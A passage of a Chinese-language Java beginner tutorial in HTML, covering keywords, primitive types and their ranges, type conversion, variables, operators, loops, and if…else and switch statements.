<tr>
<td align="left">throws</td>
<td align="left">声明一个异常可能被抛出</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">try</td>
<td align="left">捕获异常</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">包相关</td>
<td align="left">import</td>
<td align="left">引入</td>
</tr>
<tr>
<td align="left">package</td>
<td align="left">包</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">基本类型</td>
<td align="left">boolean</td>
<td align="left">布尔型</td>
</tr>
<tr>
<td align="left">byte</td>
<td align="left">字节型</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">char</td>
<td align="left">字符型</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">double</td>
<td align="left">双精度浮点</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">float</td>
<td align="left">单精度浮点</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">整型</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">long</td>
<td align="left">长整型</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">short</td>
<td align="left">短整型</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">变量引用</td>
<td align="left">super</td>
<td align="left">父类、超类</td>
</tr>
<tr>
<td align="left">this</td>
<td align="left">本类</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">void</td>
<td align="left">无返回值</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">保留关键字</td>
<td align="left">goto</td>
<td align="left">是关键字，但不能使用</td>
</tr>
<tr>
<td align="left">const</td>
<td align="left">是关键字，但不能使用</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>注意：</strong>Java 的 null 不是关键字，类似于 true 和 false，它是一个字面常量，不允许作为标识符使用。</p>
<hr>
<h2 id="Java注释"><a href="#Java注释" class="headerlink" title="Java注释"></a>Java注释</h2><p>类似于 C&#x2F;C++、Java 也支持单行以及多行注释。注释中的字符将被 Java 编译器忽略。</p>
<hr>
<h2 id="Java-空行"><a href="#Java-空行" class="headerlink" title="Java 空行"></a>Java 空行</h2><p>空白行或者有注释的行，Java 编译器都会忽略掉。</p>
<h1 id="Java-数据类型"><a href="#Java-数据类型" class="headerlink" title="Java 数据类型"></a>Java 数据类型</h1><h2 id="Java-基本数据类型"><a href="#Java-基本数据类型" class="headerlink" title="Java 基本数据类型"></a>Java 基本数据类型</h2><p><strong>类型默认值</strong></p>
<p> Java 各个类型的默认值：</p>
<table>
<thead>
<tr>
<th align="center"><strong>数据类型</strong></th>
<th align="center"><strong>默认值</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">byte</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">short</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">0L</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">0.0f</td>
</tr>
<tr>
<td align="center">double</td>
<td align="center">0.0d</td>
</tr>
<tr>
<td align="center">char</td>
<td align="center">‘u0000’</td>
</tr>
<tr>
<td align="center">String (or any object)</td>
<td align="center">null</td>
</tr>
<tr>
<td align="center">boolean</td>
<td align="center">false</td>
</tr>
</tbody></table>
<p><strong>Java各个数据类型的内存占用和取值范围</strong></p>
<table>
<thead>
<tr>
<th align="center"><strong>数据类型</strong></th>
<th align="center">内存占用</th>
<th align="center">取值范围</th>
</tr>
</thead>
<tbody><tr>
<td align="center">byte</td>
<td align="center">1</td>
<td align="center">-128~127</td>
</tr>
<tr>
<td align="center">short</td>
<td align="center">2</td>
<td align="center">-32768~32767</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">4</td>
<td align="center">-2的31次方到2的31次方-1</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">8</td>
<td align="center">-2的63次方到2的63次方-1</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">4</td>
<td align="center">负数: -3.402823E+38到-1.401298E-45 <br/>正数: 1.401298E-45到3.402823E+38</td>
</tr>
<tr>
<td align="center">double</td>
<td align="center">8</td>
<td align="center">负数:-1.797693E+308到-4.9000000E-324 <br/>正数:4.9000000E-324到1.797693E+308</td>
</tr>
<tr>
<td align="center">char</td>
<td align="center">2</td>
<td align="center">0-65535</td>
</tr>
<tr>
<td align="center">boolean</td>
<td align="center">1</td>
<td align="center">true,false</td>
</tr>
</tbody></table>
<p><strong>说明:E+38表示是乘以10的38次方，同样，E-45表示乘以10的负45次方</strong></p>
<ul>
<li><strong>空常量（空值null）不能直接输出</strong></li>
</ul>
<h2 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h2><ol>
<li>类（class）</li>
<li>接口（interface）</li>
<li>数组（[  ]）</li>
</ol>
<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p><strong>整型、实型（常量）、字符型数据可以混合运算。运算中，不同类型的数据先转化为同一类型，然后进行运算。</strong></p>
<p>转换从低级到高级。</p>
<p>低  ————————————————————-&gt;  高</p>
<p>byte,short,char—&gt; int —&gt; long—&gt; float —&gt; double </p>
<p>数据类型转换必须满足如下规则：</p>
<ul>
<li><ol>
<li>不能对boolean类型进行类型转换。</li>
</ol>
</li>
<li><ol start="2">
<li>不能把对象类型转换成不相关类的对象。</li>
</ol>
</li>
<li><ol start="3">
<li>在把容量大的类型转换为容量小的类型时必须使用强制类型转换。</li>
</ol>
</li>
<li><ol start="4">
<li>转换过程中可能导致溢出或损失精度，例如：</li>
</ol>
<p>int i &#x3D;128;<br>byte b &#x3D; (byte)i;</p>
<p>因为 byte 类型是 8 位，最大值为127，所以当 int 强制转换为 byte 类型时，值 128 时候就会导致溢出。</p>
</li>
<li><ol start="5">
<li><p>浮点数到整数的转换是通过舍弃小数得到，而不是四舍五入，例如：</p>
<p>(int)23.7 &#x3D;&#x3D; 23;<br>(int)-45.89f &#x3D;&#x3D; -45</p>
</li>
</ol>
</li>
</ul>
<h3 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h3><p>必须满足转换前的数据类型的位数要低于转换后的数据类型，例如: short数据类型的位数为16位，就可以自动转换位数为32的int类型，同样float数据类型的位数为32，可以自动转换为64位的double类型。</p>
<h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><ul>
<li><ol>
<li>条件是转换的数据类型必须是兼容的。</li>
</ol>
</li>
<li><ol start="2">
<li>格式：(type)value type是要强制类型转换后的数据类型 实例：</li>
</ol>
</li>
</ul>
<h3 id="隐含强制类型转换"><a href="#隐含强制类型转换" class="headerlink" title="隐含强制类型转换"></a>隐含强制类型转换</h3><ol>
<li>小数默认是 double 类型浮点型，在定义 float 类型时必须在数字后面跟上 F 或者 f</li>
<li>整数的默认类型是 int,在定义long类型时，为防止整数过大，后面要加L</li>
</ol>
<h1 id="Java-变量类型"><a href="#Java-变量类型" class="headerlink" title="Java 变量类型"></a>Java 变量类型</h1><p>在Java语言中，所有的变量在使用前必须声明。声明变量的基本格式如下：</p>
<p>type identifier [ &#x3D; value];</p>
<p><strong>格式说明：</strong></p>
<ul>
<li>type – 数据类型。</li>
<li>identifier – 是变量名，可以使用逗号 <strong>,</strong> 隔开来声明多个同类型变量。</li>
</ul>
<p>以下列出了一些变量的声明实例。注意有些包含了初始化过程。</p>
<p>int a, b, c;     &#x2F;&#x2F; 声明三个int型整数：a、 b、c </p>
<p>int d &#x3D; 3, e &#x3D; 4, f &#x3D; 5; &#x2F;&#x2F; 声明三个整数并赋予初值 </p>
<p>byte z &#x3D; 22;     &#x2F;&#x2F; 声明并初始化 z </p>
<p>String s &#x3D; “runoob”;  &#x2F;&#x2F; 声明并初始化字符串 s </p>
<p>double pi &#x3D; 3.14159; &#x2F;&#x2F; 声明了双精度浮点型变量 pi </p>
<p>char x &#x3D; ‘x’;    &#x2F;&#x2F; 声明变量 x 的值是字符 ‘x’。</p>
<p><strong>Java 语言支持的变量类型有：</strong></p>
<ul>
<li><strong>局部变量（Local Variables）：</strong>定义在方法、构造方法或语句块中的变量，作用域只限于当前方法、构造方法或语句块中。局部变量必须在使用前声明，并且不能被访问修饰符修饰。</li>
<li><strong>成员变量（Instance Variables）：</strong>定义在类中、方法之外的变量，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问。成员变量可以被访问修饰符修饰。</li>
<li><strong>静态变量（Class Variables）：</strong>定义在类中、方法之外的变量，并且使用 <code>static</code> 关键字修饰，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问，静态变量的值在程序运行期间只有一个副本。静态变量可以被访问修饰符修饰。</li>
<li><strong>参数变量（Parameters）：</strong>方法定义时声明的变量，作为调用该方法时传递给方法的值。参数变量的作用域只限于方法内部。</li>
</ul>
<p><strong>常量和静态变量的区别</strong></p>
<p>常量也是与类相关的，但它是用 final 关键字修饰的变量，一旦被赋值就不能再修改。与静态变量不同的是，常量在编译时就已经确定了它的值，而静态变量的值可以在运行时改变。另外，常量通常用于存储一些固定的值，如数学常数、配置信息等，而静态变量通常用于存储可变的数据，如计数器、全局状态等。</p>
<p>总之，静态变量是与类相关的变量，具有唯一性和共享性，可以用于存储整个程序都需要使用的数据，但需要注意初始化时机和与常量的区别。</p>
<h1 id="Java-运算符"><a href="#Java-运算符" class="headerlink" title="Java 运算符"></a>Java 运算符</h1><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>算术运算符用在数学表达式中，它们的作用和在数学中的作用一样。下表列出了所有的算术运算符。</p>
<p>表格中的实例假设整数变量A的值为10，变量B的值为20：</p>
<table>
<thead>
<tr>
<th align="center">操作符</th>
<th align="center">描述</th>
<th align="center">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td align="center">加法 - 相加运算符两侧的值</td>
<td align="center">A + B 等于 30</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">减法 - 左操作数减去右操作数</td>
<td align="center">A – B 等于 -10</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">乘法 - 相乘操作符两侧的值</td>
<td align="center">A * B等于200</td>
</tr>
<tr>
<td align="center">&#x2F;</td>
<td align="center">除法 - 左操作数除以右操作数</td>
<td align="center">B &#x2F; A等于2</td>
</tr>
<tr>
<td align="center">％</td>
<td align="center">取余 - 左操作数除以右操作数的余数</td>
<td align="center">B%A等于0</td>
</tr>
<tr>
<td align="center">++</td>
<td align="center">自增: 操作数的值增加1</td>
<td align="center">B++ 或 ++B 等于 21</td>
</tr>
<tr>
<td align="center">–</td>
<td align="center">自减: 操作数的值减少1</td>
<td align="center">B– 或 –B 等于 19</td>
</tr>
</tbody></table>
<h2 id="自增自减运算符"><a href="#自增自减运算符" class="headerlink" title="自增自减运算符"></a>自增自减运算符</h2><p><strong>1、自增（++）自减（–）运算符</strong>是一种特殊的算术运算符，在算术运算符中需要两个操作数来进行运算，而自增自减运算符是一个操作数。</p>
<p><strong>2、前缀自增自减法(++a,–a):</strong> 先进行自增或者自减运算，再进行表达式运算。</p>
<p><strong>3、后缀自增自减法(a++,a–):</strong> 先进行表达式运算，再进行自增或者自减运算 关系运算符</p>
<p>下表为Java支持的关系运算符</p>
<p>表格中的实例整数变量A的值为10，变量B的值为20：</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x3D;&#x3D;</td>
<td align="center">检查如果两个操作数的值是否相等，如果相等则条件为真。</td>
<td align="center">（A &#x3D;&#x3D; B）为false</td>
</tr>
<tr>
<td align="center">!&#x3D;</td>
<td align="center">检查如果两个操作数的值是否相等，如果值不相等则条件为真。</td>
<td align="center">(A !&#x3D; B) 为true</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">检查左操作数的值是否大于右操作数的值，如果是那么条件为真。</td>
<td align="center">（A&gt; B）为false</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">检查左操作数的值是否小于右操作数的值，如果是那么条件为真。</td>
<td align="center">（A &lt;B）为true</td>
</tr>
<tr>
<td align="center">&gt;&#x3D;</td>
<td align="center">检查左操作数的值是否大于或等于右操作数的值，如果是那么条件为真。</td>
<td align="center">（A&gt; &#x3D; B）false</td>
</tr>
<tr>
<td align="center">&lt;&#x3D;</td>
<td align="center">检查左操作数的值是否小于或等于右操作数的值，如果是那么条件为真。</td>
<td align="center">（A &lt;&#x3D; B）为true</td>
</tr>
</tbody></table>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>Java定义了位运算符，应用于整数类型(int)，长整型(long)，短整型(short)，字符型(char)，和字节型(byte)等类型。</p>
<p>位运算符作用在所有的位上，并且按位运算。假设a &#x3D; 60，b &#x3D; 13;它们的二进制格式表示将如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A = 0011 1100</span><br><span class="line">B = 0000 1101</span><br><span class="line">-----------------</span><br><span class="line">A&amp;B = 0000 1100</span><br><span class="line">A | B = 0011 1101</span><br><span class="line">A ^ B = 0011 0001</span><br><span class="line">~A= 1100 0011</span><br></pre></td></tr></table></figure>

<p>下表列出了位运算符的基本运算，假设整数变量 A 的值为 60 和变量 B 的值为 13：</p>
<table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">描述</th>
<th align="left">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="left">＆</td>
<td align="left">如果相对应位都是1，则结果为1，否则为0</td>
<td align="left">（A＆B），得到12，即0000 1100</td>
</tr>
<tr>
<td align="left">|</td>
<td align="left">如果相对应位都是 0，则结果为 0，否则为 1</td>
<td align="left">（A | B）得到61，即 0011 1101</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">如果相对应位值相同，则结果为0，否则为1</td>
<td align="left">（A ^ B）得到49，即 0011 0001</td>
</tr>
<tr>
<td align="left">〜</td>
<td align="left">按位取反运算符翻转操作数的每一位，即0变成1，1变成0。</td>
<td align="left">（〜A）得到-61，即1100 0011</td>
</tr>
<tr>
<td align="left">&lt;&lt;</td>
<td align="left">按位左移运算符。左操作数按位左移右操作数指定的位数。</td>
<td align="left">A &lt;&lt; 2得到240，即 1111 0000</td>
</tr>
<tr>
<td align="left">&gt;&gt;</td>
<td align="left">按位右移运算符。左操作数按位右移右操作数指定的位数。</td>
<td align="left">A &gt;&gt; 2得到15即 1111</td>
</tr>
<tr>
<td align="left">&gt;&gt;&gt;</td>
<td align="left">按位右移补零操作符。左操作数的值按右操作数指定的位数右移，移动得到的空位以零填充。</td>
<td align="left">A&gt;&gt;&gt;2得到15即0000 1111</td>
</tr>
</tbody></table>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>下表列出了逻辑运算符的基本运算，假设布尔变量A为真，变量B为假</p>
<table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">描述</th>
<th align="left">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp;&amp;</td>
<td align="left">称为逻辑与运算符。当且仅当两个操作数都为真，条件才为真。</td>
<td align="left">（A &amp;&amp; B）为假。</td>
</tr>
<tr>
<td align="left">| |</td>
<td align="left">称为逻辑或操作符。如果任何两个操作数任何一个为真，条件为真。</td>
<td align="left">（A | | B）为真。</td>
</tr>
<tr>
<td align="left">！</td>
<td align="left">称为逻辑非运算符。用来反转操作数的逻辑状态。如果条件为true，则逻辑非运算符将得到false。</td>
<td align="left">！（A &amp;&amp; B）为真。</td>
</tr>
</tbody></table>
<h2 id="短路逻辑运算符"><a href="#短路逻辑运算符" class="headerlink" title="短路逻辑运算符"></a>短路逻辑运算符</h2><p>当使用与逻辑运算符时，在两个操作数都为true时，结果才为true，但是当得到第一个操作为false时，其结果就必定是false，这时候就不会再判断第二个操作了。</p>
<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><p>public class LuoJi{   </p>
<p>​			 public static void main(String[] args){       </p>
<p>​						 int a &#x3D; 5;&#x2F;&#x2F;定义一个变量；        </p>
<p>​						boolean b &#x3D; (a&lt;4)&amp;&amp;(a++&lt;10);        </p>
<p>​						System.out.println(“使用短路逻辑运算符的结果为”+b);       </p>
<p>​						System.out.println(“a的结果为”+a);    } }</p>
<p>运行结果为：</p>
<p>使用短路逻辑运算符的结果为false<br>a的结果为5</p>
<blockquote>
<p><strong>解析：</strong> 该程序使用到了短路逻辑运算符(&amp;&amp;)，首先判断 a&lt;4 的结果为 false，则 b 的结果必定是 false，所以不再执行第二个操作 a++&lt;10 的判断，所以 a 的值为 5。</p>
</blockquote>
<h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>拓展的赋值运算符隐含了强制类型转化</p>
<table>
<thead>
<tr>
<th align="center">操作符</th>
<th align="center">描述</th>
<th align="center">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x3D;</td>
<td align="center">简单的赋值运算符，将右操作数的值赋给左侧操作数</td>
<td align="center">C &#x3D; A + B将把A + B得到的值赋给C</td>
</tr>
<tr>
<td align="center">+ &#x3D;</td>
<td align="center">加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数</td>
<td align="center">C + &#x3D; A等价于C &#x3D; C + A</td>
</tr>
<tr>
<td align="center">- &#x3D;</td>
<td align="center">减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数</td>
<td align="center">C - &#x3D; A等价于C &#x3D; C - A</td>
</tr>
<tr>
<td align="center">* &#x3D;</td>
<td align="center">乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数</td>
<td align="center">C * &#x3D; A等价于C &#x3D; C * A</td>
</tr>
<tr>
<td align="center">&#x2F; &#x3D;</td>
<td align="center">除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数</td>
<td align="center">C &#x2F; &#x3D; A，C 与 A 同类型时等价于 C &#x3D; C &#x2F; A</td>
</tr>
<tr>
<td align="center">（％）&#x3D;</td>
<td align="center">取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数</td>
<td align="center">C％&#x3D; A等价于C &#x3D; C％A</td>
</tr>
<tr>
<td align="center">&lt;&lt; &#x3D;</td>
<td align="center">左移位赋值运算符</td>
<td align="center">C &lt;&lt; &#x3D; 2等价于C &#x3D; C &lt;&lt; 2</td>
</tr>
<tr>
<td align="center">&gt;&gt; &#x3D;</td>
<td align="center">右移位赋值运算符</td>
<td align="center">C &gt;&gt; &#x3D; 2等价于C &#x3D; C &gt;&gt; 2</td>
</tr>
<tr>
<td align="center">＆&#x3D;</td>
<td align="center">按位与赋值运算符</td>
<td align="center">C＆&#x3D; 2等价于C &#x3D; C＆2</td>
</tr>
<tr>
<td align="center">^ &#x3D;</td>
<td align="center">按位异或赋值操作符</td>
<td align="center">C ^ &#x3D; 2等价于C &#x3D; C ^ 2</td>
</tr>
<tr>
<td align="center">| &#x3D;</td>
<td align="center">按位或赋值操作符</td>
<td align="center">C | &#x3D; 2等价于C &#x3D; C | 2</td>
</tr>
</tbody></table>
<h2 id="条件运算符（-）"><a href="#条件运算符（-）" class="headerlink" title="条件运算符（?:）"></a>条件运算符（?:）</h2><p>条件运算符也被称为三元运算符。该运算符有3个操作数，并且需要判断布尔表达式的值。该运算符的主要是决定哪个值应该赋值给变量。</p>
<p>variable x &#x3D; (expression) ? value if true : value if false</p>
<h2 id="instanceof-运算符"><a href="#instanceof-运算符" class="headerlink" title="instanceof 运算符"></a>instanceof 运算符</h2><p>该运算符用于操作对象实例，检查该对象是否是一个特定类型（类类型或接口类型）。</p>
<p>instanceof运算符使用格式如下：</p>
<p>( Object reference variable ) instanceof  (class&#x2F;interface type)</p>
<p>如果运算符左侧变量所指的对象，是操作符右侧类或接口(class&#x2F;interface)的一个对象，那么结果为真。</p>
<p>例：</p>
<p>String name &#x3D; “James”;<br>boolean result &#x3D; name instanceof String; &#x2F;&#x2F; 由于 name 是 String 类型，所以返回真</p>
<p>如果被比较的对象兼容于右侧类型，该运算符仍然返回 true。</p>
<h2 id="Java运算符优先级"><a href="#Java运算符优先级" class="headerlink" title="Java运算符优先级"></a>Java运算符优先级</h2><p>当多个运算符出现在一个表达式中，谁先谁后呢？这就涉及到运算符的优先级别的问题。在一个多运算符的表达式中，运算符优先级不同会导致最后得出的结果差别甚大。</p>
<p>例如，（1+3）＋（3+2）*2，这个表达式如果按加号最优先计算，答案就是 18，如果按照乘号最优先，答案则是 14。</p>
<p>再如，x &#x3D; 7 + 3 * 2;这里x得到13，而不是20，因为乘法运算符比加法运算符有较高的优先级，所以先计算3 * 2得到6，然后再加7。</p>
<p>下表中具有最高优先级的运算符在的表的最上面，最低优先级的在表的底部。</p>
<table>
<thead>
<tr>
<th align="left">类别</th>
<th align="left">操作符</th>
<th align="left">关联性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">后缀</td>
<td align="left">() [] . (点操作符)</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">一元</td>
<td align="left">expr++ expr–</td>
<td align="left">从左到右</td>
</tr>
<tr>
<td align="left">一元</td>
<td align="left">++expr –expr + - ～ ！</td>
<td align="left">从右到左</td>
</tr>
<tr>
<td align="left">乘性</td>
<td align="left">* &#x2F;％</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">加性</td>
<td align="left">+ -</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">移位</td>
<td align="left">&gt;&gt; &gt;&gt;&gt;  &lt;&lt;</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">关系</td>
<td align="left">&gt; &gt;&#x3D; &lt; &lt;&#x3D;</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">相等</td>
<td align="left">&#x3D;&#x3D; !&#x3D;</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">按位与</td>
<td align="left">＆</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">按位异或</td>
<td align="left">^</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">按位或</td>
<td align="left">|</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">逻辑与</td>
<td align="left">&amp;&amp;</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">逻辑或</td>
<td align="left">| |</td>
<td align="left">左到右</td>
</tr>
<tr>
<td align="left">条件</td>
<td align="left">？：</td>
<td align="left">从右到左</td>
</tr>
<tr>
<td align="left">赋值</td>
<td align="left">&#x3D; + &#x3D; - &#x3D; * &#x3D; &#x2F; &#x3D;％&#x3D; &gt;&gt; &#x3D; &lt;&lt; &#x3D;＆&#x3D; ^ &#x3D; | &#x3D;</td>
<td align="left">从右到左</td>
</tr>
<tr>
<td align="left">逗号</td>
<td align="left">，</td>
<td align="left">左到右</td>
</tr>
</tbody></table>
<h1 id="Java-循环结构-for-while-及-do…while"><a href="#Java-循环结构-for-while-及-do…while" class="headerlink" title="Java 循环结构 - for, while 及 do…while"></a>Java 循环结构 - for, while 及 do…while</h1><h2 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h2><p>while是最基本的循环，它的结构为：</p>
<p>while( 布尔表达式 ) {  &#x2F;&#x2F;循环内容 }</p>
<p>只要布尔表达式为 true，循环就会一直执行下去。</p>
<h2 id="do…while-循环"><a href="#do…while-循环" class="headerlink" title="do…while 循环"></a>do…while 循环</h2><p>对于 while 语句而言，如果不满足条件，则不能进入循环。但有时候我们需要即使不满足条件，也至少执行一次。</p>
<p>do…while 循环和 while 循环相似，不同的是，do…while 循环至少会执行一次。</p>
<p>do {<br>       &#x2F;&#x2F;代码语句<br>}while(布尔表达式);</p>
<p><strong>注意：</strong>布尔表达式在循环体的后面，所以语句块在检测布尔表达式之前已经执行了。 如果布尔表达式的值为 true，则语句块一直执行，直到布尔表达式的值为 false。</p>
<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>虽然所有循环结构都可以用 while 或者 do…while表示，但 Java 提供了另一种语句 —— for 循环，使一些循环结构变得更加简单。</p>
<p>for循环执行的次数是在执行前就确定的。语法格式如下：</p>
<p>for(初始化; 布尔表达式; 更新) {    &#x2F;&#x2F;代码语句 }</p>
<p>关于 for 循环有以下几点说明：</p>
<ul>
<li>最先执行初始化步骤。可以声明一种类型，但可初始化一个或多个循环控制变量，也可以是空语句。</li>
<li>然后，检测布尔表达式的值。如果为 true，循环体被执行。如果为false，循环终止，开始执行循环体后面的语句。</li>
<li>执行一次循环后，更新循环控制变量。</li>
<li>再次检测布尔表达式。循环执行上面的过程。</li>
</ul>
<h2 id="break-关键字"><a href="#break-关键字" class="headerlink" title="break 关键字"></a>break 关键字</h2><p>break 主要用在循环语句或者 switch 语句中，用来跳出整个语句块。</p>
<p>break 跳出最里层的循环，并且继续执行该循环下面的语句。</p>
<h2 id="continue-关键字"><a href="#continue-关键字" class="headerlink" title="continue 关键字"></a>continue 关键字</h2><p>continue 适用于任何循环控制结构中。作用是让程序立刻跳转到下一次循环的迭代。</p>
<p>在 for 循环中，continue 语句使程序立即跳转到更新语句。</p>
<p>在 while 或者 do…while 循环中，程序立即跳转到布尔表达式的判断语句。</p>
<h1 id="Java-条件语句-if…else"><a href="#Java-条件语句-if…else" class="headerlink" title="Java 条件语句 - if…else"></a>Java 条件语句 - if…else</h1><p>Java 中的条件语句允许程序根据条件的不同执行不同的代码块。</p>
<p>一个 if 语句包含一个布尔表达式和一条或多条语句。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>if 语句的语法如下：</p>
<p>if(布尔表达式) {   &#x2F;&#x2F;如果布尔表达式为true将执行的语句 }</p>
<p>如果布尔表达式的值为 true，则执行 if 语句中的代码块，否则执行 else 语句块后面的代码。</p>
<h2 id="if…else语句"><a href="#if…else语句" class="headerlink" title="if…else语句"></a>if…else语句</h2><p>if 语句后面可以跟 else 语句，当 if 语句的布尔表达式值为 false 时，else 语句块会被执行。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>if…else 的用法如下：</p>
<p>if(布尔表达式){   &#x2F;&#x2F;如果布尔表达式的值为true }</p>
<p>else{   &#x2F;&#x2F;如果布尔表达式的值为false }</p>
<hr>
<h2 id="if…else-语句"><a href="#if…else-语句" class="headerlink" title="if…else 语句"></a>if…else 语句</h2><p>if 语句后面可以跟 else if…else 语句，这种语句可以检测到多种可能的情况。</p>
<p>使用 if，else if，else 语句的时候，需要注意下面几点：</p>
<ul>
<li>if 语句至多有 1 个 else 语句，else 语句在所有的 else if 语句之后。</li>
<li>if 语句可以有若干个 else if 语句，它们必须在 else 语句之前。</li>
<li>一旦其中一个 else if 语句检测为 true，其他的 else if 以及 else 语句都将跳过执行。</li>
</ul>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p>if…else 语法格式如下:</p>
<p>if(布尔表达式 1){   &#x2F;&#x2F;如果布尔表达式 1的值为true执行代码 }</p>
<p>else if(布尔表达式 2){   &#x2F;&#x2F;如果布尔表达式 2的值为true执行代码 }</p>
<p>else if(布尔表达式 3){   &#x2F;&#x2F;如果布尔表达式 3的值为true执行代码 }</p>
<p>else {   &#x2F;&#x2F;如果以上布尔表达式都不为true执行代码 }</p>
<hr>
<h2 id="嵌套的-if…else-语句"><a href="#嵌套的-if…else-语句" class="headerlink" title="嵌套的 if…else 语句"></a>嵌套的 if…else 语句</h2><p>使用嵌套的 if…else 语句是合法的。也就是说你可以在另一个 if 或者 else if 语句中使用 if 或者 else if 语句。</p>
<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p>嵌套的 if…else 语法格式如下：</p>
<p>if(布尔表达式 1){   &#x2F;&#x2F;&#x2F;&#x2F;如果布尔表达式 1的值为true执行代码 </p>
<p>​     if(布尔表达式 2){      &#x2F;&#x2F;&#x2F;&#x2F;如果布尔表达式 2的值为true执行代码 } }</p>
<h1 id="Java-switch-case-语句"><a href="#Java-switch-case-语句" class="headerlink" title="Java switch case 语句"></a>Java switch case 语句</h1><p>switch case 语句判断一个变量与一系列值中某个值是否相等，每个值称为一个分支。</p>
<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><p>switch case 语句语法格式如下：</p>
<p>switch(expression){    case value :       &#x2F;&#x2F;语句       break; &#x2F;&#x2F;可选    case value :       &#x2F;&#x2F;语句       break; &#x2F;&#x2F;可选    &#x2F;&#x2F;你可以有任意数量的case语句    default : &#x2F;&#x2F;可选       &#x2F;&#x2F;语句 }</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2018/09/java-switch-case-flow-diagram.jpeg" alt="img"></p>
<p>switch case 语句有如下规则：</p>
<ul>
<li>switch 语句中的变量类型可以是： byte、short、int 或者 char。从 Java SE 7 开始，switch 支持字符串 String 类型了，同时 case 标签必须为字符串常量或字面量。</li>
<li>switch 语句可以拥有多个 case 语句。每个 case 后面跟一个要比较的值和冒号。</li>
<li>case 语句中的值的数据类型必须与变量的数据类型相同，而且只能是常量或者字面常量。</li>
<li>当变量的值与 case 语句的值相等时，那么 case 语句之后的语句开始执行，直到 break 语句出现才会跳出 switch 语句。</li>
<li>当遇到 break 语句时，switch 语句终止。程序跳转到 switch 语句后面的语句执行。case 语句不必须要包含 break 语句。如果没有 break 语句出现，程序会继续执行下一条 case 语句，直到出现 break 语句。</li>
<li>switch 语句可以包含一个 default 分支，该分支一般是 switch 语句的最后一个分支（可以在任何位置，但建议在最后一个）。default 在没有 case 语句的值和变量值相等的时候执行。default 分支不需要 break 语句。</li>
</ul>
<p><strong>switch case 执行时，一定会先进行匹配，匹配成功返回当前 case 的值，再根据是否有 break，判断是否继续输出，或是跳出判断。</strong></p>
